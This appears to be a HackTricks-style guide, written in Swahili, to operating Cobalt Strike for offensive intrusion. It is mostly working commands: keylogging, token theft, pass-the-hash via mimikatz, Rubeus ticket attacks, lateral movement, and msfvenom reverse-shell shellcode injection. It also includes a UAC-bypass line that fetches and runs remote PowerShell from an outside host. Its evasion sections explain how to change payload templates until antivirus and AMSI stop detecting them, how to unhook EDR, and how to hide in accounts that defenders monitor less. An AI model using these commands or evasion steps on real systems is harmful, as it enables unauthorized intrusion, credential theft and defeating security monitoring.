# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua mahali pa kusikiliza, aina ya beacon ya kutumia (http, dns, smb...) na mengine.

### Peer2Peer Listeners

Beacons za listeners hizi hazihitaji kuwasiliana na C2 moja kwa moja; zinaweza kuwasiliana nayo kupitia beacons nyingine.

`Cobalt Strike -> Listeners -> Add/Edit` kisha unahitaji kuchagua TCP au SMB beacons

* **TCP beacon itaweka listener kwenye port iliyochaguliwa**. Ili kuunganisha kwenye TCP beacon, tumia command `connect <ip> <port>` kutoka kwenye beacon nyingine
* **smb beacon itasikiliza kwenye pipename yenye jina lililochaguliwa**. Ili kuunganisha kwenye SMB beacon, unahitaji kutumia command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** kwa faili za HTA
* **`MS Office Macro`** kwa office document yenye macro
* **`Windows Executable`** kwa .exe, .dll au service .exe
* **`Windows Executable (S)`** kwa **stageless** .exe, .dll au service .exe (stageless ni bora kuliko staged, kwa kuwa ina IoCs chache)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Hii itatengeneza script/executable ya kupakua beacon kutoka Cobalt Strike katika formats kama vile: bitsadmin, exe, powershell na python

#### Host Payloads

Ikiwa tayari una file unayotaka ku-host kwenye web server, nenda kwenye `Attacks -> Web Drive-by -> Host File` kisha uchague file ya ku-host na web server config.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent inahitaji tu kuwasiliana kwa kutumia Team Server HTTP/S protocol ya Cobalt Strike (default malleable C2 profile) ili kujisajili/check-in na kupokea tasks. Tekeleza URIs/headers/metadata crypto zilezile zilizofafanuliwa kwenye profile ili kutumia tena Cobalt Strike UI kwa tasking na output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (kwa mfano, `CustomBeacon.cna`) inaweza kufungasha payload generation kwa beacon isiyo ya Windows, ili operators waweze kuchagua listener na kutoa ELF payloads moja kwa moja kutoka kwenye GUI.
- Mfano wa Linux task handlers zinazowasilishwa kwa Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, na `exit`. Hizi huwakilisha task IDs zinazotarajiwa na Team Server na lazima zitekelezwe server-side ili zirudishe output katika format sahihi.
- BOF support kwenye Linux inaweza kuongezwa kwa kupakia Beacon Object Files in-process kwa kutumia [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (inaunga mkono pia Outflank-style BOFs), na hivyo kuruhusu modular post-exploitation kuendeshwa ndani ya context/privileges za implant bila kuanzisha processes mpya.<sup>[[2]](#references)[[3]](#references)</sup>
- Embed SOCKS handler kwenye custom beacon ili kudumisha pivoting parity na Windows Beacons: operator anapoendesha `socks <port>`, implant inapaswa kufungua local proxy ya kupitisha operator tooling kupitia Linux host iliyo-compromise hadi kwenye internal networks.

## Opsec

### Execute-Assembly

**`execute-assembly`** hutumia **sacrificial process** kupitia remote process injection ili ku-execute program iliyoainishwa. Hii huwa noisy sana kwa sababu ili ku-inject ndani ya process hutumiwa Win APIs fulani ambazo kila EDR huzi-check. Hata hivyo, kuna custom tools zinazoweza kutumika kupakia kitu ndani ya process hiyo hiyo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Kwenye Cobalt Strike unaweza pia kutumia BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` itaunda command ya `helpx` kwenye Cobalt Strike ambayo itaweka colors kwenye commands zinazoonyesha ikiwa ni BOFs (green), ikiwa ni Frok&Run (yellow) na nyingine zinazofanana, au ikiwa ni ProcessExecution, injection au zinazofanana (red). Hii husaidia kujua ni commands zipi zilizo stealthy zaidi.

### Modern in-process post-execution

Versions za hivi karibuni zinaongeza alternatives mbili wakati classic COFF BOF ina constraints nyingi:

- **Beacon Interpreter** hukompile C kwenye Team Server kuwa intermediate bytecode na kuitekeleza kwenye VM iliyowekwa ndani ya Beacon. Bytecode hubaki kuwa data badala ya native executable code, hivyo hii huepuka executable allocation ya ziada na permission transition ya RW-to-RX ambayo kwa kawaida huhitajika kupakia BOF. Scripts zinaweza ku-import Beacon API na kutangaza BOF-style Dynamic Function Resolution (DFR) prototypes.
- **BOF-PE** hupakia EXE au DLL kamili kwenye Beacon ya sasa. Format hii inaunga mkono normal PE imports, exception handling, C++ iliyoboreshwa zaidi na external libraries huku ikiendelea kuhifadhi Beacon API. Hii ni nzito kuliko COFF BOF ndogo, kwa hiyo itumie tu wakati runtime ya ziada inahitajika.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
Mbinu hizi hupunguza signals zinazohusiana na loader, si telemetry inayozalishwa na vitendo vya script au calls za Windows API.<sup>[[8]](#references)</sup>

### Jifanya kuwa mtumiaji

Unaweza kuangalia events kama `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Angalia interactive logons zote ili kujua saa za kawaida za kazi.
- System EID 12,13 - Angalia frequency ya shutdown/startup/sleep.
- Security EID 4624/4625 - Angalia majaribio ya NTLM inbound yaliyo halali/yasiyo halali.
- Security EID 4648 - Event hii huundwa credentials za plaintext zinapotumika ku-logon. Ikiwa process iliizalisha, binary inaweza kuwa na credentials katika clear text ndani ya config file au ndani ya code.

Unapotumia `jump` kutoka cobalt strike, ni bora kutumia method ya `wmi_msbuild` ili kufanya process mpya ionekane halali zaidi.

### Tumia computer accounts

Ni kawaida kwa defenders kuangalia behaviours zisizo za kawaida zinazozalishwa na users na **kuwatenga service accounts na computer accounts kama `*$` kwenye monitoring yao**. Unaweza kutumia accounts hizi kufanya lateral movement au privilege escalation.

### Tumia stageless payloads

Stageless payloads zina kelele kidogo kuliko staged kwa sababu hazihitaji kupakua stage ya pili kutoka kwa C2 server. Hii inamaanisha hazizalishi network traffic baada ya connection ya kwanza, hivyo kuna uwezekano mdogo wa kugunduliwa na network-based defenses.

### Tokens & Token Store

Kuwa mwangalifu unapoiba au kutengeneza tokens kwa sababu EDR inaweza ku-enumerate thread tokens na kugundua **token inayomilikiwa na user mwingine** au hata SYSTEM ndani ya process.

Hii inaruhusu kuhifadhi tokens **kwa kila beacon**, hivyo si lazima kuiba token hiyo hiyo tena na tena. Hii ni muhimu kwa lateral movement au unapohitaji kutumia token iliyoibwa mara nyingi:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Unapohama laterally, kwa kawaida ni bora **kuiba token kuliko kutengeneza mpya** au kufanya pass the hash attack.

### Guardrails

Cobalt Strike ina feature inayoitwa **Guardrails** inayosaidia kuzuia matumizi ya commands au actions fulani ambazo zinaweza kugunduliwa na defenders. Guardrails zinaweza kusanidiwa kuzuia commands maalum, kama vile `make_token`, `jump`, `remote-exec`, na nyingine zinazotumika kwa kawaida kwenye lateral movement au privilege escalation.

Zaidi ya hayo, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) pia ina checks na ideas ambazo unaweza kuzingatia kabla ya kutekeleza payload.

### Usimbaji fiche wa tickets

Katika AD kuwa mwangalifu na usimbaji fiche wa tickets. Kwa default, baadhi ya tools zitatumia RC4 encryption kwa Kerberos tickets, ambayo si salama kama AES encryption, na environments zilizosasishwa kwa default zitatumia AES. Hili linaweza kugunduliwa na defenders wanaofuatilia weak encryption algorithms.

### Epuka defaults

Unapotumia Cobalt Stricke, kwa default SMB pipes zitakuwa na majina `msagent_####` na `"status_####"`. Badilisha majina hayo. Inawezekana kuangalia majina ya pipes zilizopo kutoka Cobal Strike kwa command: `ls \\.\pipe\`

Zaidi ya hayo, kwenye SSH sessions pipe inayoitwa `\\.\pipe\postex_ssh_####` huundwa. Ibadilishe kwa `set ssh_pipename "<new_name>";`.

Pia katika poext exploitation attack pipes `\\.\pipe\postex_####` zinaweza kubadilishwa kwa `set pipename "<new_name>"`.

Katika Cobalt Strike profiles unaweza pia kubadilisha vitu kama:

- Kuepuka kutumia `rwx`
- Jinsi process injection behavior inavyofanya kazi (ni APIs zipi zitatumika) katika block ya `process-inject {...}`
- Jinsi "fork and run" inavyofanya kazi katika block ya `post-ex {…}`
- Muda wa sleep
- Max size ya binaries zitakazopakiwa kwenye memory
- Memory footprint na DLL content kwa block ya `stage {...}`
- Network traffic

### Sleepmask and BeaconGate

Sleepmask hubadilisha Beacon na tracked heap allocations zake ikiwa dormant, kisha huzirejesha kwa ajili ya task execution. Releases za sasa hutoa default yenye evasiveness, lakini custom Sleepmask BOFs bado zinafaa wakati memory layout, allocation au call-stack requirements zinapotofautiana. Kuanzia 4.13, default Sleepmask pia hu-spoof return address kwa APIs zinazoproxy kupitia BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** huendeleza muundo huu zaidi ya `Sleep`: calls za WinAPI zilizochaguliwa huwakilishwa kama structures za `FUNCTION_CALL` na kutumwa kwa Sleepmask BOF, ambayo inaweza ku-mask Beacon wakati wa kutekeleza call. Profile inaweza ku-gate group (`Comms`, `Core`, `Cleanup` au `All`) au APIs binafsi pekee:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
Kwa API iliyoorodheshwa chini ya `beacon_gate`, gate hutangulia `syscall_method`; APIs ambazo hazijaorodheshwa bado zinaweza kutumia syscall method iliyosanidiwa. `beacon_gate disable` na `beacon_gate enable` hubadilisha hali ya feature wakati wa runtime. Epuka kuwezesha `All` bila kufikiri: commands kama `ps` huita `OpenProcess`/`CloseHandle` mara kwa mara na zinaweza kusababisha ongezeko la CPU wakati kila call inamask na ku-unmask Beacon. Sleepmask-VS hutoa hali za Beacon/Sleepmask zilizofanyiwa mock kwa debugging ya custom gates bila kuendelea kuzijaribu kupitia implant hai.<sup>[[9]](#references)</sup>

### Noisy proc injections

Wakati wa kuingiza code kwenye process, kwa kawaida hatua hii huwa noisy sana, kwa sababu **hakuna process ya kawaida ambayo kwa kawaida hufanya kitendo hiki na kwa sababu njia za kufanya hivyo ni chache sana**. Kwa hivyo, inaweza kugunduliwa na mifumo ya detection inayotegemea tabia. Zaidi ya hayo, inaweza pia kugunduliwa na EDRs zinazochanganua mtandao kwa **threads zilizo na code ambayo haipo kwenye disk** (ingawa processes kama browsers zinazotumia JIT huwa na hali hii mara kwa mara). Mfano: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Wakati wa kuanzisha process mpya, ni muhimu **kudumisha uhusiano wa kawaida wa parent-child** kati ya processes ili kuepuka detection. Ikiwa svchost.exec inaendesha iexplorer.exe, itaonekana kuwa ya kutia shaka, kwa sababu svchost.exe si parent wa iexplorer.exe katika mazingira ya kawaida ya Windows.

Beacon mpya inapoanzishwa katika Cobalt Strike, kwa default process inayotumia **`rundll32.exe`** huundwa ili kuendesha listener mpya. Hii si stealthy sana na inaweza kugunduliwa kwa urahisi na EDRs. Zaidi ya hayo, `rundll32.exe` huendeshwa bila args zozote, jambo linaloifanya ionekane ya kutia shaka zaidi.

Kwa command ifuatayo ya Cobalt Strike, unaweza kubainisha process tofauti ya kuanzisha beacon mpya, na kuifanya isiwe rahisi kugunduliwa:
```bash
spawnto x86 svchost.exe
```
Unaweza pia kubadilisha setting hii **`spawnto_x86` na `spawnto_x64`** katika profile.

### Ku-proxy traffic ya attackers

Attackers wakati mwingine watahitaji kuweza kuendesha tools locally, hata kwenye machines za Linux, na kufanya traffic ya victims ifikie tool (kwa mfano, NTLM relay).

Zaidi ya hayo, wakati mwingine kufanya attack ya pass-the.hash au pass-the-ticket huwa stealthier kwa attacker **kuongeza hash au ticket hiyo kwenye LSASS process yake mwenyewe** locally, kisha kufanya pivot kutoka humo badala ya kurekebisha LSASS process ya victim machine.

Hata hivyo, unahitaji kuwa **makini na traffic inayozalishwa**, kwa kuwa unaweza kutuma traffic isiyo ya kawaida (kerberos?) kutoka kwenye backdoor process yako. Kwa hili, unaweza kufanya pivot hadi kwenye browser process (ingawa unaweza kukamatwa uki-inject ndani ya process hiyo, kwa hiyo fikiria njia ya stealth ya kufanya hivyo).


### Kuepuka AVs

#### AV/AMSI/ETW Bypass

Angalia ukurasa:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Kwa kawaida katika `/opt/cobaltstrike/artifact-kit` unaweza kupata code na templates zilizokwisha-compile (katika `/src-common`) za payloads ambazo cobalt strike itatumia kutengeneza binary beacons.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na backdoor iliyotengenezwa (au template iliyocompilewa tu), unaweza kubaini kinachosababisha defender i-trigger. Kwa kawaida huwa ni string. Kwa hiyo unaweza kurekebisha code inayotengeneza backdoor ili string hiyo isionekane kwenye binary ya mwisho.

Baada ya kurekebisha code, endesha tu `./build.sh` kutoka kwenye directory hiyo hiyo na unakili folder ya `dist-pipe/` kwenye Windows client katika `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Usisahau kupakia script ya aggressive `dist-pipe\artifact.cna` ili kuashiria Cobalt Strike itumie resources zilizo kwenye disk tunazotaka, badala ya zile zilizopakiwa.

#### Resource Kit

Folder ya ResourceKit ina templates za payloads za Cobalt Strike zinazotegemea script, zikiwemo PowerShell, VBA na HTA.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na templates, unaweza kubaini ni kipengele gani ambacho defender (AMSI katika hali hii) hakikubali, kisha ukibadilishe:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Kwa kurekebisha mistari iliyotambuliwa, mtu anaweza kutengeneza template ambayo haitagunduliwa.

Usisahau kupakia script kali `ResourceKit\resources.cna` ili kuielekeza Cobalt Strike kutumia resources kutoka kwenye disk tunazotaka, badala ya zile zilizopakiwa.

#### Function hooks | Syscall

Function hooking ni mbinu inayotumika sana na ERDs kugundua shughuli hasidi. Cobalt Strike hukuruhusu kupita hooks hizi kwa kutumia **syscalls** badala ya miito ya kawaida ya Windows API kwa kutumia config ya **`None`**, au kutumia toleo la `Nt*` la function kwa setting ya **`Direct`**, au kuruka tu function ya `Nt*` kwa chaguo la **`Indirect`** kwenye malleable profile. Kulingana na mfumo, chaguo moja linaweza kuwa la siri zaidi kuliko jingine.

Hili linaweza kuwekwa kwenye profile au kwa kutumia command **`syscall-method`**

Hata hivyo, hili pia linaweza kutoa kelele.

Chaguo mojawapo linalotolewa na Cobalt Strike la kupita function hooks ni kuondoa hooks hizo kwa kutumia: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Unaweza pia kuangalia ni functions zipi zimewekewa hooks kwa kutumia [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) au [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader na Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Uchambuzi wa Unit42 kuhusu usimbaji fiche wa metadata ya Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Taarifa ya SANS ISC kuhusu traffic ya Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Imepotea Katika Tafsiri](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Kupitia BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
